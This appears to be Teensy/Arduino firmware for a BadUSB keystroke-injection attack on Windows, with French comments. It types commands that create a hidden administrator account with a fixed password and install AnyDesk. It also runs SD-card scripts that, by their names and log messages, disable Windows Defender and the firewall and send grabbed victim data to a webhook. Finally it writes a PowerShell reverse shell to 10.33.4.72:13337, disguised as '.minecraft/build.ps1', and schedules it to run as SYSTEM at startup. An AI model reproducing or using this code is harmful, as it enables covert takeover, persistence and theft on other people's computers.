#include <USBHost_t36.h>
#include <SD.h>
#include <Keyboard.h>
#include <cstring> 

//###################### - [START] GLOBALS VAR - ######################

USBHost usb;
File root;
String port = "";

int LONG_DELAY = 1000;//=> Auto Delay
int PRINT_DELAY = 10; 

int SHORT_DELAY = (LONG_DELAY / 2);
int VERY_SHORT_DELAY = (LONG_DELAY / 4);
int DEMON_DELAY = (LONG_DELAY * 20);
int EXTREMELY_LONG_DELAY = (LONG_DELAY * 2);

const int LED = 13;

//###################### - [END] GLOBALS VAR - ######################

//==>Log function | STRING:cause STRING:data
void log(String cause, String data){
  //=> Time of programme
  unsigned long now = millis();
  unsigned long hours = now / 3600000;
  unsigned long mins = (now % 3600000) / 60000;
  unsigned long secs = ((now % 3600000) % 60000) / 1000;
  
  //=> Format result for log
  String timestamp = String(hours) + ":" + (mins < 10 ? "0" : "") + String(mins) + ":" + (secs < 10 ? "0" : "") + String(secs);
  String result = cause + "[-" + timestamp + "-]: " + data;

  String filename = ".data/log.txt";//==> filename on SD CARD
  File dataFile = SD.open(filename.c_str(), FILE_WRITE);
  if (dataFile) {
    dataFile.println(result.c_str());
    dataFile.close();
  } else {
    Serial.println("Erreur lors de l'ouverture du fichier");
  }
}

//==> Load SD CARD
void initialize_SD_and_USB() {
  Serial.begin(9600);
  delay(SHORT_DELAY);

  usb.begin();

  delay(SHORT_DELAY);

  if (!SD.begin(BUILTIN_SDCARD)) {
    Serial.println("Échec de l'initialisation de la carte SD");
    while (1);
  }
  
  root = SD.open("/");
  usb.Task();
  root.close();
  delay(LONG_DELAY);
}

//==> Force installation about the reverse shell
void use_script_install_shell() {
  delay(SHORT_DELAY);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  delay(VERY_SHORT_DELAY);
  Keyboard.releaseAll();

  delay(LONG_DELAY);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(VERY_SHORT_DELAY);
  Keyboard.releaseAll();

  delay(LONG_DELAY); 

  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r'); 
  delay(VERY_SHORT_DELAY); 
  Keyboard.releaseAll(); 
  Keyboard.print("cmd /k echo off");//=> Auto with zero information & auto kill the terminal
  delay(LONG_DELAY); 

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(LONG_DELAY); 
  Keyboard.press(KEY_LEFT_ARROW);
  delay(VERY_SHORT_DELAY);
  Keyboard.release(KEY_LEFT_ARROW);

  delay(VERY_SHORT_DELAY);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(LONG_DELAY);
  
  // => Hugly configuration with escape caracteres (^)
  const char *commands[] = {
    "mkdir .minecraft",
    "attrib +h .minecraft",
    "echo. > .minecraft/build.ps1",
    "echo $client = New-Object System.Net.Sockets.TCPClient('10.33.4.72',13337); > .minecraft/build.ps1",
    "echo $stream = $client.GetStream(); >> .minecraft/build.ps1",
    "echo [byte[]]$bytes = 0..65535^|%{0}; >> .minecraft/build.ps1",
    "echo while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ >> .minecraft/build.ps1",
    "echo    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); >> .minecraft/build.ps1",
    "echo    $sendback = (iex \". { $data } 2^>&1\" ^| Out-String ); >> .minecraft/build.ps1",
    "echo    $sendback2 = $sendback + 'PS ' + ^(pwd^).Path + '^> '; >> .minecraft/build.ps1",
    "echo    $sendbyte = (^[text.encoding]::ASCII^).GetBytes($sendback2); >> .minecraft/build.ps1",
    "echo    $stream.Write($sendbyte,0,$sendbyte.Length); >> .minecraft/build.ps1",
    "echo    $stream.Flush() >> .minecraft/build.ps1",
    "echo } >> .minecraft/build.ps1",
    "cmd /c start /min cmd /c \"powershell.exe -ExecutionPolicy Bypass -File 'C:\\Users\\User\\Desktop\\ReverseShell.ps1'\"",
    "cmd /c start /min cmd /c \"schtasks /create /tn \"ReverseShell\" /tr \"powershell.exe -ExecutionPolicy Bypass -File '.minecraft/build.ps1'\" /sc ONSTART /ru SYSTEM ^& pause\""
};

  //=> Auto delay to write the line
  for (const char *cmd : commands) {
    delay(SHORT_DELAY);
    Keyboard.print(cmd);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.releaseAll();
  }

  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();
}

//==> Write data from SD files STRING (FILE & data)
void write_data_to_file(String filename, String data) {
  File dataFile = SD.open(filename.c_str(), FILE_WRITE);
  if (dataFile) {
    dataFile.println(data.c_str());
    dataFile.close();
  } else {
    Serial.println("Erreur lors de l'ouverture du fichier");
  }
}

//==> Load file and run the script CHAR* filename
void use_script(const char* filename) {
  delay(SHORT_DELAY);
  File dataFile = SD.open(filename);
  if (dataFile) {
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_ESC);
    delay(VERY_SHORT_DELAY);
    Keyboard.releaseAll();

    delay(LONG_DELAY);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(VERY_SHORT_DELAY);
    Keyboard.releaseAll();

    delay(LONG_DELAY); 

    Keyboard.press(KEY_LEFT_GUI); 
    Keyboard.press('r'); 
    delay(VERY_SHORT_DELAY); 
    Keyboard.releaseAll(); 
    Keyboard.print("cmd /k echo off");//=> Run the script & auto kill terminal
    delay(LONG_DELAY); 

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(LONG_DELAY); 
    Keyboard.press(KEY_LEFT_ARROW);
    delay(VERY_SHORT_DELAY);
    Keyboard.release(KEY_LEFT_ARROW);

    delay(VERY_SHORT_DELAY);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(LONG_DELAY);
    Keyboard.releaseAll();

   
    while (dataFile.available()) {
      String line = dataFile.readStringUntil('\n');
      delay(LONG_DELAY);
      
      //=> Auto delay
      for (unsigned int i = 0; i < line.length(); i++) {
        Keyboard.print(line[i]);
        delay(PRINT_DELAY);
      }
      
      delay(VERY_SHORT_DELAY); 

      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      
      Keyboard.print("cls");
      Keyboard.press(KEY_RETURN);
      Keyboard.release(KEY_RETURN);
      Keyboard.releaseAll();
    }

    dataFile.close();
    Keyboard.print("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.releaseAll();
  } else {//=> Error loading file
    Serial.println("Erreur lors de l'ouverture du fichier");
  }
}

//==> Open hugly terminal
void open_hugly_cmd(String command) {

//#### - [START] Clear the selection - ####

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  delay(VERY_SHORT_DELAY);
  Keyboard.releaseAll();
  
//#### - [END] Clear the selection - ####

  delay(LONG_DELAY);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(VERY_SHORT_DELAY);
  Keyboard.releaseAll();

  delay(LONG_DELAY);

  // => Auto delay
  for (unsigned int i = 0; i < command.length(); i++) {
    Keyboard.print(command.charAt(i));
    delay(PRINT_DELAY); 
  }

  delay(LONG_DELAY); 
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(LONG_DELAY); 

  Keyboard.press(KEY_LEFT_ARROW);

  delay(VERY_SHORT_DELAY);

  Keyboard.release(KEY_LEFT_ARROW);

  delay(VERY_SHORT_DELAY);

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

//==> Create USER ADMIN with auto command = '/c'
void create_admin(){
  delay(LONG_DELAY);
  String command = "cmd /c net user nagibAdmin 12301230 /add & net user nagibAdmin 12301230 & net localgroup administrateurs nagibAdmin & cmd /c net user nagibAdmin 2>&1 || echo introuvable > COM6";
  delay(VERY_SHORT_DELAY);
  open_hugly_cmd(command);
}

//==> Reaveal the port selected by the computer for the usb
void whoaim(){
  delay(LONG_DELAY);
  String command = "cmd /c start /min cmd /c \"for /L %x in (1,1,256) do @for /f \"tokens=2 delims==\" %i in ('wmic path Win32_SerialPort Where \"Name like '%%USB Serial Device%%'\" get DeviceID /value ^| findstr \"DeviceID\"') do @echo %i > COM%x\" & echo test > COM1";
  delay(VERY_SHORT_DELAY); 
  open_hugly_cmd(command);
}

//==> Run the configuration
void run_as_admin(){
  delay(SHORT_DELAY);
  initialize_SD_and_USB();
  log("CARTE_SD","Carte SD Load avec succées");

  delay(SHORT_DELAY);
  use_script("anydesk_script/any_installation.txt");
  log("INSTALLATION","AnyDesk installée avec succès");

  delay(SHORT_DELAY);
  use_script("anydesk_script/any_id.txt");
  digitalWrite(LED, HIGH);
  delay(LONG_DELAY);
  use_script("die_firewall/die.txt");
  log("FIREWALL&WDEFENDER","Windows defender & firewall détruit avec succès.");

  delay(SHORT_DELAY);
  use_script("grabber/installation.txt");
  log("GRABBER","Victime grab ===> Envoyé sur le weebHook");

  delay(SHORT_DELAY);
  use_script_install_shell();
  log("REVSHELL","Installation du script .minecraft/build.ps1 exécuté avec succès.");
  log("REVSHELL","Lancement du script après redémarrage fait avec succès.");  
}

//==> Run init
void run(){
  delay(SHORT_DELAY);
  initialize_SD_and_USB();
  create_admin();
}

//==> Run the default function 
void setup() {
  delay(LONG_DELAY);
  initialize_SD_and_USB();
  log("-----------","------------------------------------------|");
  log("LANCEMENT","Teensy à démarré.");
  //#### - [START] Search port & start config (delete the port at whoaim & replace by 'port' = global var)- ####
  
  //whoaim();

  //#### - [END] Search port & start config - ####

  //#### - [START] Force the configuration & modifie port at whoaim() - ####

  create_admin();
  delay(SHORT_DELAY);
  run_as_admin();

  //#### - [END] Force the configuration & modifie port at whoaim() - ####
}

//==> Default Loop (use to receive the port by whoiam() function )
void loop() {
  if (Serial.available() > 0) { //=> Check receive data from the computer on the USB port
    //=> Led up when the data is on
    //digitalWrite(LED, HIGH);
    
    String data = Serial.readString(); //==> Convert to string

    if (data.indexOf("introuvable") != -1){//If the user not create, try to create another with delay +100
      log("DELAY","Utilisateur introuvable, ajout de delay");
      LONG_DELAY += 100;
      create_admin();
    }else{//=> Continue the configuration
      delay(LONG_DELAY);
      //port = data; //=> Receive the port & add to global var

      log("SUCESS","Admin crée avec succès. nagibAdmin : 12301230");
      run();
      delay(SHORT_DELAY);
      run_as_admin();
    }
  }
}